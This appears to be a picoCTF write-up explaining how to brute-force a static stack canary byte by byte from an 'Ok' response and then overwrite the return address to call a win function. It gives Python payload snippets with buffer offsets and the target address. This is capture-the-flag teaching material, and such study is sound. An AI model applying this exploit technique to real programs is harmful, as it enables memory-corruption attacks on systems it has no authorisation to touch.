# Canary Bypass — Static Canary Brute Force

**Platform:** picoCTF  
**Technique:** Stack Canary Brute Force / ret2win  
**Difficulty:** Hard  

## Challenge Description

A binary with a **stack canary** protection. The program leaks whether the canary was correct by printing "Ok" after each input. Using this feedback, we can brute-force the canary byte by byte, then overwrite the return address to call the win function.

## Vulnerability

The stack canary is **static** (not randomized across runs). The program provides feedback ("Ok" or crash) when we guess the canary correctly. This allows us to brute-force it.

## Exploitation

### Phase 1: Brute Force the Canary (buffer.py)

The canary is 4 bytes. Each byte is brute-forced separately:

```python
for i in range(1, 5):  # 4 bytes
    for guess in range(256):
        payload = b"A" * 64 + found_canary + bytes([guess])
        io.send(payload)
        if b"Ok" in result:
            found_canary += bytes([guess])
            break
```
64 bytes to reach the canary

Each byte guessed from 0x00 to 0xFF

Correct guess returns "Ok", wrong guess crashes

Phase 2: Exploit (exploit.py)
Once the canary (b"BiRd") is found:

```python
payload = b"A" * 64        # buffer
payload += final_canary    # preserved canary
payload += b"A" * 16       # padding to return address
payload += win_addr        # overwrite return address
```
64 bytes to reach canary

Canary preserved (no stack smash detection)

16 bytes to reach return address

Win address at 0x08049336
